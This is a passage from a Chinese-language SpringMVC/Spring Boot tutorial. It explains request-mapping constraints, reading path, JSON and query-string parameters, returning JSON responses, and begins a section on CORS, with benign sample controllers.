<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/testMethod&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testMethod处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testMethod&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-2-3-指定请求参数"><a href="#4-2-3-指定请求参数" class="headerlink" title="4.2.3 指定请求参数"></a>4.2.3 指定请求参数</h4><p>​    我们可以使用<strong>params</strong>属性来对请求参数进行一些限制。可以要求必须具有某些参数，或者是某些参数必须是某个值，或者是某些参数必须不是某个值。</p>
<p>例如：</p>
<p>​    我们期望让请求的资源路径为**/test/testParams<strong>的</strong>GET<strong>请求,并且请求参数中</strong>具有code参数**的请求能够被testParams方法处理。则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testParams&quot;,method = RequestMethod.GET,params = &quot;code&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testParams</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testParams处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testParams&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>​    如果是要求<strong>不能有code</strong>这个参数可以把改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testParams&quot;,method = RequestMethod.GET,params = &quot;!code&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testParams</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testParams处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testParams&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>​    如果要求有code这参数，并且这参数值必须<strong>是某个值</strong>可以改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testParams&quot;,method = RequestMethod.GET,params = &quot;code=sgct&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testParams</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testParams处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testParams&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​    如果要求有code这参数，并且这参数值必须<strong>不是某个值</strong>可以改成如下形式    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testParams&quot;,method = RequestMethod.GET,params = &quot;code!=sgct&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testParams</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testParams处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testParams&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-2-4-指定请求头"><a href="#4-2-4-指定请求头" class="headerlink" title="4.2.4 指定请求头"></a>4.2.4 指定请求头</h4><p>​    我们可以使用<strong>headers</strong>属性来对请求头进行一些限制。</p>
<p>例如：</p>
<p>​    我们期望让请求的资源路径为**/test/testHeaders的<strong>GET</strong>请求,并且请求头中<strong>具有</strong>deviceType**的请求能够被testHeaders方法处理。则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testHeaders&quot;,method = RequestMethod.GET,headers = &quot;deviceType&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHeaders</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testHeaders处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testHeaders&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​    如果是要求不能有<strong>deviceType</strong>这个请求头可以把改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testHeaders&quot;,method = RequestMethod.GET,headers = &quot;!deviceType&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHeaders</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testHeaders处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testHeaders&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​    如果要求有deviceType这个请求头，并且其值必须<strong>是某个值</strong>可以改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testHeaders&quot;,method = RequestMethod.GET,headers = &quot;deviceType=ios&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHeaders</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testHeaders处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testHeaders&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​    如果要求有deviceType这个请求头，并且其值必须<strong>不是某个值</strong>可以改成如下形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testHeaders&quot;,method = RequestMethod.GET,headers = &quot;deviceType!=ios&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testHeaders</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testHeaders处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testHeaders&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-2-5-指定请求头Content-Type"><a href="#4-2-5-指定请求头Content-Type" class="headerlink" title="4.2.5 指定请求头Content-Type"></a>4.2.5 指定请求头Content-Type</h4><p>​    我们可以使用<strong>consumes</strong>属性来对<strong>Content-Type</strong>这个请求头进行一些限制。</p>
<h5 id="范例一"><a href="#范例一" class="headerlink" title="范例一"></a>范例一</h5><p>​    我们期望让请求的资源路径为**/test/testConsumes**的POST请求,并且请求头中的Content-Type头必须为 <strong>multipart/from-data</strong> 的请求能够被testConsumes方法处理。则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/testConsumes&quot;,method = RequestMethod.POST,consumes = &quot;multipart/from-data&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testConsumes</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testConsumes处理了请求&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testConsumes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="范例二"><a href="#范例二" class="headerlink" title="范例二"></a>范例二</h5><p>​    如果我们要求请求头Content-Type的值必须<strong>不能为某个multipart/from-data</strong>则可以改成如下形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/testConsumes&quot;,method = RequestMethod.POST,consumes = &quot;!multipart/from-data&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testConsumes</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testConsumes处理了请求&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testConsumes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-获取请求参数"><a href="#4-3-获取请求参数" class="headerlink" title="4.3 获取请求参数"></a>4.3 获取请求参数</h3><h4 id="4-3-1-获取路径参数"><a href="#4-3-1-获取路径参数" class="headerlink" title="4.3.1 获取路径参数"></a>4.3.1 获取路径参数</h4><h5 id="RestFul风格"><a href="#RestFul风格" class="headerlink" title="RestFul风格"></a>RestFul风格</h5><p>​    RestFul风格的接口一些参数是在请求路径上的。类似： /user/1  这里的1就是id。</p>
<p>​    如果我们想获取这种格式的数据可以使用**@PathVariable**来实现。</p>
<h5 id="范例一-1"><a href="#范例一-1" class="headerlink" title="范例一"></a>范例一</h5><p>​    要求定义个RestFul风格的接口，该接口可以用来根据id查询用户。请求路径要求为  /user  ，请求方式要求为GET。</p>
<p>​    而请求参数id要写在请求路径上，例如  /user/1   这里的1就是id。</p>
<p>​    我们可以定义如下方法，通过如下方式来获取路径参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/user/&#123;id&#125;&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findUserById</span><span class="params">( <span class="meta">@PathVariable(&quot;id&quot;)</span>Integer id)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;findUserById&quot;</span>);</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;findUserById&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="范例二-1"><a href="#范例二-1" class="headerlink" title="范例二"></a>范例二</h5><p>​    如果这个接口，想根据id和username查询用户。请求路径要求为  /user  ，请求方式要求为GET。</p>
<p>​    而请求参数id和name要写在请求路径上，例如  /user/1/zs   这里的1就是id，zs是name</p>
<p>​    我们可以定义如下方法，通过如下方式来获取路径参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/user/&#123;id&#125;/&#123;name&#125;&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findUser</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,<span class="meta">@PathVariable(&quot;name&quot;)</span> String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;findUser&quot;</span>);</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;findUser&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-3-2-获取请求体中的Json格式参数"><a href="#4-3-2-获取请求体中的Json格式参数" class="headerlink" title="4.3.2 获取请求体中的Json格式参数"></a>4.3.2 获取请求体中的Json格式参数</h4><p>​    RestFul风格的接口一些比较复杂的参数会转换成Json通过请求体传递过来。这种时候我们可以使用**@RequestBody**注解获取请求体中的数据。</p>
<h5 id="4-3-2-1-配置"><a href="#4-3-2-1-配置" class="headerlink" title="4.3.2.1 配置"></a>4.3.2.1 配置</h5><p>​    SpringBoot的web启动器已经默认导入了jackson的依赖，不需要再额外导入依赖了。</p>
<h5 id="4-3-2-2-使用"><a href="#4-3-2-2-使用" class="headerlink" title="4.3.2.2 使用"></a>4.3.2.2 使用</h5><h6 id="范例一-2"><a href="#范例一-2" class="headerlink" title="范例一"></a>范例一</h6><p>​    要求定义个RestFul风格的接口，该接口可以用来新建用户。请求路径要求为  /user  ，请求方式要求为POST。</p>
<p>用户数据会转换成json通过请求体传递。<br>​    请求体数据</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;三更&quot;</span>,<span class="attr">&quot;age&quot;</span>:<span class="number">15</span>&#125;</span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>1.获取参数封装成实体对象</p>
<p>​    如果我们想把Json数据获取出来封装User对象,我们可以这样定义方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;insertUser&quot;</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;insertUser&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    User实体类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>2.获取参数封装成Map集合</p>
<p>​    也可以把该数据获取出来封装成Map集合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> Map map)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;insertUser&quot;</span>);</span><br><span class="line">    System.out.println(map);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;insertUser&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="范例二-2"><a href="#范例二-2" class="headerlink" title="范例二"></a>范例二</h6><p>​    如果请求体传递过来的数据是一个User集合转换成的json，Json数据可以这样定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;三更1&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">14</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;三更2&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">15</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;三更3&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">16</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>​    方法定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/users&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">insertUsers</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;User&gt; users)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;insertUsers&quot;</span>);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;insertUser&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="4-3-2-3-注意事项"><a href="#4-3-2-3-注意事项" class="headerlink" title="4.3.2.3 注意事项"></a>4.3.2.3 注意事项</h5><p>​    <label style="background:yellow">如果需要使用@RequestBody来获取请求体中Json并且进行转换，要求请求头 Content-Type 的值要为： application/json 。</label></p>
<h4 id="4-3-3-获取QueryString格式参数"><a href="#4-3-3-获取QueryString格式参数" class="headerlink" title="4.3.3 获取QueryString格式参数"></a>4.3.3 获取QueryString格式参数</h4><p>​    如果接口的参数是使用QueryString的格式的话，我们也可以使用SpringMVC快速获取参数。</p>
<p>​    我们可以使用**@RequestParam**来获取QueryString格式的参数。</p>
<h5 id="4-3-3-1-使用"><a href="#4-3-3-1-使用" class="headerlink" title="4.3.3.1 使用"></a>4.3.3.1 使用</h5><h6 id="范例一-3"><a href="#范例一-3" class="headerlink" title="范例一"></a>范例一</h6><p>​    要求定义个接口，该接口请求路径要求为  /testRequestParam，请求方式无要求。参数为id和name和likes。使用QueryString的格式传递。</p>
<p>1.参数单独的获取</p>
<p>​    如果我们想把id，name，likes单独获取出来可以使用如下写法：</p>
<p>​    在方法中定义方法参数，方法参数名要和请求参数名一致，这种情况下我们可以省略**@RequestParam**注解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(Integer id, String name, String[] likes)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(id);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    如果方法参数名和请求参数名不一致，我们可以加上**@RequestParam**注解例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(<span class="meta">@RequestParam(&quot;id&quot;)</span> Integer uid,<span class="meta">@RequestParam(&quot;name&quot;)</span> String name, <span class="meta">@RequestParam(&quot;likes&quot;)</span>String[] likes)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(uid);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2.获取参数封装成实体对象</p>
<p>​    如果我们想把这些参数封装到一个User对象中可以使用如下写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(User user)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    User类定义如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String[] likes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    测试时请求url如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/testRquestParam?id=1&amp;name=三更草堂&amp;likes=编程&amp;likes=录课&amp;likes=烫头</span></span><br></pre></td></tr></table></figure>



<p>​    <strong>注意：实体类中的成员变量要和请求参数名对应上。并且要提供对应的set/get方法。</strong></p>
<h4 id="4-3-4-相关注解其他属性"><a href="#4-3-4-相关注解其他属性" class="headerlink" title="4.3.4 相关注解其他属性"></a>4.3.4 相关注解其他属性</h4><h5 id="4-3-4-1-required"><a href="#4-3-4-1-required" class="headerlink" title="4.3.4.1 required"></a>4.3.4.1 required</h5><p>​    代表是否必须，默认值为true也就是必须要有对应的参数。如果没有就会报错。</p>
<p>​    如果对应的参数可传可不传则可以把其设置为fasle</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;id&quot;,required = false)</span> Integer uid,<span class="meta">@RequestParam(&quot;name&quot;)</span> String name, <span class="meta">@RequestParam(&quot;likes&quot;)</span>String[] likes)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(uid);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="4-3-4-2-defaultValue"><a href="#4-3-4-2-defaultValue" class="headerlink" title="4.3.4.2 defaultValue"></a>4.3.4.2 defaultValue</h5><p>​    如果对应的参数没有，我们可以用defaultValue属性设置默认值。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRquestParam&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testRquestParam</span><span class="params">(<span class="meta">@RequestParam(value = &quot;id&quot;,required = false,defaultValue = &quot;777&quot;)</span> Integer uid,<span class="meta">@RequestParam(&quot;name&quot;)</span> String name, <span class="meta">@RequestParam(&quot;likes&quot;)</span>String[] likes)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;testRquestParam&quot;</span>);</span><br><span class="line">    System.out.println(uid);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testRquestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-响应体响应数据"><a href="#4-4-响应体响应数据" class="headerlink" title="4.4 响应体响应数据"></a>4.4 响应体响应数据</h3><p>​    无论是RestFul风格还是我们之前web阶段接触过的异步请求，都需要把数据转换成Json放入响应体中。</p>
<h4 id="4-4-1-数据放到响应体"><a href="#4-4-1-数据放到响应体" class="headerlink" title="4.4.1 数据放到响应体"></a>4.4.1 数据放到响应体</h4><p>​    我们的SpringMVC为我们提供了**@ResponseBody**来非常方便的把Json放到响应体中。</p>
<p>​    <strong>@ResponseBody</strong>可以加在哪些东西上面？类上和方法上</p>
<p>​    具体代码请参考范例。</p>
<h4 id="4-4-2-数据转换成Json"><a href="#4-4-2-数据转换成Json" class="headerlink" title="4.4.2 数据转换成Json"></a>4.4.2 数据转换成Json</h4><h5 id="4-4-2-1-配置"><a href="#4-4-2-1-配置" class="headerlink" title="4.4.2.1 配置"></a>4.4.2.1 配置</h5><p>​    SpringBoot项目中使用了web的start后，不需要进行额外的依赖和配置</p>
<h5 id="4-4-2-2-使用"><a href="#4-4-2-2-使用" class="headerlink" title="4.4.2.2 使用"></a>4.4.2.2 使用</h5><p>​    只要把要转换的数据直接作为方法的返回值返回即可。SpringMVC会帮我们把返回值转换成json。具体代码请参考范例。</p>
<h4 id="4-4-3-范例"><a href="#4-4-3-范例" class="headerlink" title="4.4.3 范例"></a>4.4.3 范例</h4><h5 id="范例一-4"><a href="#范例一-4" class="headerlink" title="范例一"></a>范例一</h5><p>​    要求定义个RestFul风格的接口，该接口可以用来根据id查询用户。请求路径要求为  /response/user  ，请求方式要求为GET。</p>
<p>​    而请求参数id要写在请求路径上，例如   /response/user/1   这里的1就是id。</p>
<p>​    要求获取参数id,去查询对应id的用户信息（模拟查询即可，可以选择直接new一个User对象），并且转换成json响应到响应体中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/response&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResponseController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/user/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(id, <span class="string">&quot;三更草堂&quot;</span>, <span class="number">15</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-5-跨域请求"><a href="#4-5-跨域请求" class="headerlink" title="4.5 跨域请求"></a>4.5 跨域请求</h3><h4 id="4-5-1-什么是跨域"><a href="#4-5-1-什么是跨域" class="headerlink" title="4.5.1 什么是跨域"></a>4.5.1 什么是跨域</h4><p>​    浏览器出于安全的考虑，使用 XMLHttpRequest对象发起 HTTP请求时必须遵守同源策略，否则就是跨域的HTTP请求，默认情况下是被禁止的。 同源策略要求源相同才能正常进行通信，即协议、域名、端口号都完全一致。 </p>
<h4 id="4-5-2-CORS解决跨域"><a href="#4-5-2-CORS解决跨域" class="headerlink" title="4.5.2 CORS解决跨域"></a>4.5.2 CORS解决跨域</h4><p>​    CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing），允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</p>
<p>​    它通过服务器增加一个特殊的Header[Access-Control-Allow-Origin]来告诉客户端跨域的限制，如果浏览器支持CORS、并且判断Origin通过的话，就会允许XMLHttpRequest发起跨域请求。</p>
<p>​    </p>
<h4 id="4-5-3-SpringBoot使用CORS解决跨域"><a href="#4-5-3-SpringBoot使用CORS解决跨域" class="headerlink" title="4.5.3 SpringBoot使用CORS解决跨域"></a>4.5.3 SpringBoot使用CORS解决跨域</h4><h5 id="1-使用-CrossOrigin"><a href="#1-使用-CrossOrigin" class="headerlink" title="1.使用@CrossOrigin"></a>1.使用@CrossOrigin</h5><p>可以在支持跨域的方法上或者是Controller上加上@CrossOrigin注解</p>
